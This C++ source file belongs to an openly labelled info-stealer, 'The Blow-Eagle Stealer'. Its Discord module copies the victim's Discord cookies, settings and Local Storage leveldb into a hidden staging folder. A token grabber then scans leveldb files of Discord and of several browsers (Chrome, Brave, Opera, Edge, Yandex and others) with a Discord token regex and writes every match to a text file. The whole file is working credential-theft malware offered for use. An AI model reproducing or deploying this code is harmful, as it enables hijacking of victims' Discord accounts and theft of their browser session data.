/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.hpp"
#include "../../config/config.cpp"
#include  "../../helper/helper.hpp"
#include <fstream>
#include <sys/stat.h>
#include <regex>
#include <vector>

int TokenGrabber();

void findTokens(std::vector<std::string>& tokens, std::vector<std::string>& files);

void getFiles(std::vector<std::string>& directories, std::vector<std::string>& files);

void findMatch(std::string& content, std::regex& tokenPatter, std::vector<std::string>& tokens);

void deleteInexistantPaths(std::vector<std::string>& directories);

void getDirectories(std::vector<std::string>& directories);

void messengers::Discord()
{

	printf("Discord\n");

	std::string user = func::GetUser();

	std::string local = "C:/Users/" + user + "/AppData/Local";

	std::string roaming = "C:/Users/" + user + "/AppData/Roaming";

	if (std::filesystem::exists("C:/Users/" + user + "/AppData/Local" + "/discord"))
	{
		

		std::string files[] = {
		 "discord/Network/Cookies",
		 "discord/settings.json"
		};
		std::string dirs[] =
		{
			"discord/Local Storage/leveldb"
		};

		std::string defaultPaths[] = {

		"C:/Users/" + user + config::path + "/Messengers",
		"C:/Users/" + user + config::path + "/Messengers/Discord",
		"C:/Users/" + user + config::path + "/Messengers/Discord/Local Storage",
		"C:/Users/" + user + config::path + "/Messengers/Discord/Local Storage/leveldb"
		};

		for (size_t i = 0; i < std::size(defaultPaths); i++)
		{
			int result = _mkdir(defaultPaths[i].c_str());
		}

		for (size_t i = 0; i < std::size(files); i++)
		{
			try 
			{
				func::copyFile(roaming +'/' + files[i], defaultPaths[1]);
			}	
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}
		}

		for (size_t i = 0; i < std::size(dirs); i++)
		{
			try
			{
				func::copyDirectory(roaming + '/' + dirs[i], defaultPaths[3]);
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}
		}
	}
	if (config::dsTokenGrab)
		TokenGrabber();
}

int TokenGrabber() 
{
	printf("TG\n");

	try
	{
		std::vector<std::string> directories;
		std::vector<std::string> files;
		std::vector<std::string> tokens;

		getDirectories(directories);
		deleteInexistantPaths(directories);
		getFiles(directories, files);
		if (files.size() == 0) 
		{
			return 0;
		}
		findTokens(tokens, files);
		std::string info = "";
		std::string user = func::GetUser();
		if (tokens.size() > 0) {
			for (int i = 0; i < tokens.size(); i++) {
				info += std::string("Token: ") + std::string("<<<") + std::string(tokens[i]) + std::string(">>>") + '\n';
			}
		}
		std::ofstream file("C:/Users/" + user + config::path + "/Messengers/Discord/token-grabber.txt", std::ios::app);
		if (file.is_open())
		{
			file << info;
		}

		file.close();
	}
	catch (const char* error_message)
	{
		std::cout << error_message << std::endl;
		return 0;
	}
	return 0;

}

void findMatch(std::string& content, std::regex& tokenPatter, std::vector<std::string>& tokens)
{
	std::sregex_iterator current(content.begin(), content.end(), tokenPatter);
	std::sregex_iterator end;

	while (current != end) {
		std::smatch match = *current;
		tokens.push_back(match.str());
		current++;
	}
}

void findTokens(std::vector<std::string>& tokens, std::vector<std::string>& files)
{
	std::string DISCORD_TOKEN_REGEX = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}";

	std::regex tokenPattern(DISCORD_TOKEN_REGEX);

	for (int i = 0; i < files.size(); i++) {
		std::ifstream file(files[i], std::ios::binary);
		std::string content((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
		findMatch(content, tokenPattern, tokens);
	}
}

void getFiles(std::vector<std::string>& directories, std::vector<std::string>& files)
{
	for (int i = 0; i < directories.size(); i++) {
		for (const auto& entry : std::filesystem::directory_iterator(directories[i])) {
			std::string path = entry.path().string();
			if (path.find(".ldb") != std::string::npos || path.find(".log") != std::string::npos) {
				files.push_back(path);
			}
		}
	}
}

void deleteInexistantPaths(std::vector<std::string>& directories)
{
	for (int i = directories.size() - 1; i >= 0; i--) {
		if (!std::filesystem::exists(directories[i])) {
			directories.erase(directories.begin() + i);
		}
	}
}

void getDirectories(std::vector<std::string>& directories)
{
	char* localPath = NULL;
	char* roamingPath = NULL;

	_dupenv_s(&roamingPath, NULL, "APPDATA");
	_dupenv_s(&localPath, NULL, "LOCALAPPDATA");
	std::string discord = "\\Discord\\Local Storage\\leveldb";
	std::string discordCanary = "\\discordcanary\\Local Storage\\leveldb";
	std::string discordPTB = "\\discordptb\\Local Storage\\leveldb";
	std::string googleChrome = "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb";
	std::string chromium = "\\Chromium\\User Data\\Default\\Local Storage\\leveldb";
	std::string brave = "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb";
	std::string opera = "\\Opera Software\\Opera Stable\\Local Storage\\leveldb";
	std::string yandex = "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb";
	std::string edge = "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb";
	if (roamingPath != NULL) {
		directories.push_back(roamingPath + discord);
		directories.push_back(roamingPath + discordCanary);
		directories.push_back(roamingPath + discordPTB);
		free(roamingPath);
	}
	if (localPath != NULL) {
		directories.push_back(localPath + googleChrome);
		directories.push_back(localPath + chromium);
		directories.push_back(localPath + brave);
		directories.push_back(localPath + opera);
		directories.push_back(localPath + yandex);
		directories.push_back(localPath + edge);
		free(localPath);
	}
}
